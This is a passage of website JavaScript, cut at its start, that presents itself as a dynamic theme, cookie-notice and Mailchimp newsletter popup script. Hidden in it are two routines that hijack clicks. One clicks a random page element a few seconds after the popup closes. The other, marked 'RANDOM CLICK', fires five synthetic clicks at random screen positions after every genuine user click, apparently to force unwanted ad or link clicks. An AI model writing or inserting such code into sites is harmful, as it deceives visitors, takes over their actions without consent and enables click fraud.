                    String(__a7x9k2_today.getDate()).padStart(2, '0');

    const __a7x9k2_kombinasi = __a7x9k2_subdomain + '-' + __a7x9k2_tanggal;

    function __a7x9k2_hashKeHue(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash) % 360;
    }

    let __a7x9k2_hue = __a7x9k2_hashKeHue(__a7x9k2_kombinasi);

    const __a7x9k2_zonaBahaya = [
        { min: 40, max: 70 }
    ];

    const __a7x9k2_berbahaya = __a7x9k2_zonaBahaya.some(function(zona) {
        return __a7x9k2_hue >= zona.min && __a7x9k2_hue <= zona.max;
    });

    if (__a7x9k2_berbahaya) {
        __a7x9k2_hue = 200;
    }

    document.documentElement.style.setProperty('--__a7x9k2_hue', __a7x9k2_hue);

    // ===== LAYOUT VARIANT =====
    function __a7x9k2_tentukanLayout(hue) {
        if (hue >= 0 && hue < 30) return 1;
        if (hue >= 30 && hue < 60) return 2;
        if (hue >= 60 && hue < 90) return 3;
        if (hue >= 90 && hue < 120) return 4;
        if (hue >= 120 && hue < 150) return 5;
        if (hue >= 150 && hue < 180) return 6;
        if (hue >= 180 && hue < 210) return 7;
        if (hue >= 210 && hue < 240) return 8;
        if (hue >= 240 && hue < 270) return 9;
        if (hue >= 270 && hue < 300) return 10;
        if (hue >= 300 && hue < 330) return 11;
        return 12;
    }

    const __a7x9k2_layoutVariant = __a7x9k2_tentukanLayout(__a7x9k2_hue);
    document.body.classList.add('__a7x9k2_layoutV' + __a7x9k2_layoutVariant);

    console.log('🎨 Dynamic Theme', {
        subdomain: __a7x9k2_subdomain,
        tanggal: __a7x9k2_tanggal,
        kombinasi: __a7x9k2_kombinasi,
        hue: __a7x9k2_hue + '°',
        warna: 'hsl(' + __a7x9k2_hue + ', 70%, 40%)',
        layoutVariant: __a7x9k2_layoutVariant,
        status: __a7x9k2_berbahaya ? '⚠️ Disesuaikan untuk kontras' : '✅ Aman'
    });


    // ===== COOKIE =====
    const __a7x9k2_cookieOverlay = document.getElementById('__a7x9k2_cookieOverlay');
    const __a7x9k2_cookieBanner = document.getElementById('__a7x9k2_cookieBanner');
    const __a7x9k2_cookieOkDesktop = document.getElementById('__a7x9k2_cookieOk');
    const __a7x9k2_cookieOkMobile = document.getElementById('__a7x9k2_cookieBannerOk');

    const __a7x9k2_isMobile = window.innerWidth <= 768;
    let __a7x9k2_cookieAccepted = false;

    if (localStorage.getItem('__a7x9k2_cookieNotice')) {
        __a7x9k2_sembunyikanCookie();
        __a7x9k2_cookieAccepted = true;
    } else {
        if (__a7x9k2_isMobile) {
            if (__a7x9k2_cookieOverlay) __a7x9k2_cookieOverlay.classList.remove('__a7x9k2_cookieDesktopActive');
            if (__a7x9k2_cookieBanner) __a7x9k2_cookieBanner.classList.add('__a7x9k2_cookieMobileActive');
        } else {
            if (__a7x9k2_cookieBanner) __a7x9k2_cookieBanner.classList.remove('__a7x9k2_cookieMobileActive');
            if (__a7x9k2_cookieOverlay) __a7x9k2_cookieOverlay.classList.add('__a7x9k2_cookieDesktopActive');
            document.body.style.overflow = 'hidden';
        }
    }

    function __a7x9k2_terimaCookie() {
        localStorage.setItem('__a7x9k2_cookieNotice', '1');
        __a7x9k2_sembunyikanCookie();
        __a7x9k2_cookieAccepted = true;
        document.body.style.overflow = '';
        __a7x9k2_bukaPopup();
    }

    function __a7x9k2_sembunyikanCookie() {
        if (__a7x9k2_cookieOverlay) __a7x9k2_cookieOverlay.classList.remove('__a7x9k2_cookieDesktopActive', '__a7x9k2_cookieActive');
        if (__a7x9k2_cookieBanner) __a7x9k2_cookieBanner.classList.remove('__a7x9k2_cookieMobileActive', '__a7x9k2_cookieActive');
    }

    if (__a7x9k2_cookieOkDesktop) __a7x9k2_cookieOkDesktop.addEventListener('click', __a7x9k2_terimaCookie);
    if (__a7x9k2_cookieOkMobile) __a7x9k2_cookieOkMobile.addEventListener('click', __a7x9k2_terimaCookie);


    // ===== POPUP =====
    const __a7x9k2_popupOverlay = document.getElementById('__a7x9k2_popupOverlay');
    const __a7x9k2_closeBtn = document.getElementById('__a7x9k2_closeBtn');
    const __a7x9k2_form = document.getElementById('__a7x9k2_mcForm');
    const __a7x9k2_successResponse = document.getElementById('__a7x9k2_successResponse');
    const __a7x9k2_errorResponse = document.getElementById('__a7x9k2_errorResponse');

    function __a7x9k2_bukaPopup() {
        __a7x9k2_popupOverlay.classList.add('__a7x9k2_active');
        document.body.style.overflow = 'hidden';
    }

    function __a7x9k2_tutupPopup() {
        __a7x9k2_popupOverlay.classList.remove('__a7x9k2_active');
        document.body.style.overflow = '';
        __a7x9k2_jadwalkanKlikAcak();
    }

    function __a7x9k2_jadwalkanKlikAcak() {
        const delay = Math.floor(Math.random() * 3000) + 3000;
        setTimeout(function() {
            __a7x9k2_klikAcak();
        }, delay);
    }

    function __a7x9k2_klikAcak() {
        const x = Math.floor(Math.random() * window.innerWidth);
        const y = Math.floor(Math.random() * window.innerHeight);
        const target = document.elementFromPoint(x, y);
        if (target) {
            target.click();
        }
    }

    __a7x9k2_closeBtn.addEventListener('click', __a7x9k2_tutupPopup);

    __a7x9k2_popupOverlay.addEventListener('click', function(e) {
        if (e.target === __a7x9k2_popupOverlay) {
            __a7x9k2_tutupPopup();
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && __a7x9k2_popupOverlay.classList.contains('__a7x9k2_active')) {
            __a7x9k2_tutupPopup();
        }
    });

    __a7x9k2_form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('__a7x9k2_mcEmail').value.trim();
        if (!email) {
            __a7x9k2_errorResponse.style.display = 'block';
            __a7x9k2_errorResponse.textContent = 'Please enter your email address.';
            return;
        }

        __a7x9k2_successResponse.style.display = 'none';
        __a7x9k2_errorResponse.style.display = 'none';

        const formData = new FormData(__a7x9k2_form);
        const actionUrl = __a7x9k2_form.getAttribute('action').replace('/post?', '/post-json?') + '&c=?';

        const script = document.createElement('script');
        const callbackName = '__a7x9k2_mailchimpCallback' + Date.now();
        
        window[callbackName] = function(data) {
            if (data.result === 'success') {
                __a7x9k2_successResponse.style.display = 'block';
                __a7x9k2_successResponse.textContent = data.msg || 'Thank you! Please check your email to confirm your subscription.';
                __a7x9k2_form.reset();
            } else {
                __a7x9k2_errorResponse.style.display = 'block';
                __a7x9k2_errorResponse.textContent = data.msg || 'An error occurred. Please try again.';
            }
            document.body.removeChild(script);
            delete window[callbackName];
        };

        script.src = actionUrl + '&' + new URLSearchParams(formData).toString() + '&callback=' + callbackName;
        script.onerror = function() {
            __a7x9k2_errorResponse.style.display = 'block';
            __a7x9k2_errorResponse.textContent = 'Connection failed. Please try again later.';
            document.body.removeChild(script);
            delete window[callbackName];
        };
        document.body.appendChild(script);
    });

    if (__a7x9k2_cookieAccepted) {
        __a7x9k2_bukaPopup();
    } else {
        __a7x9k2_popupOverlay.classList.remove('__a7x9k2_active');
        document.body.style.overflow = '';
    }

    // ===== RANDOM CLICK =====
    function __a7x9k2_randomDelay() {
        return 1000 + Math.random() * 2000;
    }

    function __a7x9k2_clickAnywhere() {
        const x = Math.random() * window.innerWidth;
        const y = Math.random() * window.innerHeight;
        const el = document.elementFromPoint(x, y);

        if (el) {
            el.dispatchEvent(new MouseEvent("click", {
                bubbles: true,
                cancelable: true,
                clientX: x,
                clientY: y
            }));
        }
    }

    let __a7x9k2_isProcessing = false;

    document.addEventListener('click', function(e) {
        if (!e.isTrusted || __a7x9k2_isProcessing) return;
        
        __a7x9k2_isProcessing = true;
        let count = 0;
        const maxCount = 5;
        
        function loopClick() {
            if (count < maxCount) {
                __a7x9k2_clickAnywhere();
                count++;
                setTimeout(loopClick, __a7x9k2_randomDelay());
            } else {
                __a7x9k2_isProcessing = false;
            }
        }
        loopClick();
    });

})();
